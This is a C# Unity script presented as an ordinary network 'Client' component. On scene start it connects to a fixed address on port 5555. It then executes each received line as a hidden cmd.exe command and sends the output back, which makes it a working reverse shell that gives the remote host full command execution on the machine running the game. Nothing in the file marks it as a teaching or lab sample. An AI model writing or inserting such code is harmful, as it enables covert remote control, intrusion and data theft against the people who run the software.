using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;
using UnityEngine;

public class Client : MonoBehaviour
{
    private TcpClient client;
    private NetworkStream stream;
    private StreamReader reader;
    private StreamWriter writer;
    
    // Start is called before the first frame update
    void Start()
    {
        ConnectToServer();
    }

    void ConnectToServer()
    {
        try
        {
            client = new TcpClient("192.168.178.22", 5555);
            stream = client.GetStream();
            reader = new StreamReader(stream);
            writer = new StreamWriter(stream);

            UnityEngine.Debug.Log("Connected to server.");

            ListenForCommands();
        }
        catch (Exception e)
        {
            UnityEngine.Debug.Log("Error connecting to server: " + e.Message);
        }
    }
    

    void ListenForCommands()
    {
        while (client.Connected)
        {
            try
            {
                string command = reader.ReadLine();
                if (command != null)
                {
                    UnityEngine.Debug.Log("Recevied command: " + command);

                    string output = ExecuteCommand(command);

                    writer.WriteLine(output);
                    writer.Flush();
                }
            }
            catch (Exception e)
            {
                UnityEngine.Debug.Log("Error reading command: " + e.Message);
                break;
            }
        }

        client.Close(); 
    }


    string ExecuteCommand(string command)
    {
        try
        {
            //exectute command
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = "/c" + command;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.Start();

            //read and return command output
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            return output;
        }
        catch (Exception e)
        {
            return "Error executing command: " + e.Message;
        }
    }

    private void OnApplicationQuit()
    {
        reader?.Close();
        writer?.Close();
        stream?.Close();
        client?.Close();
    }
}
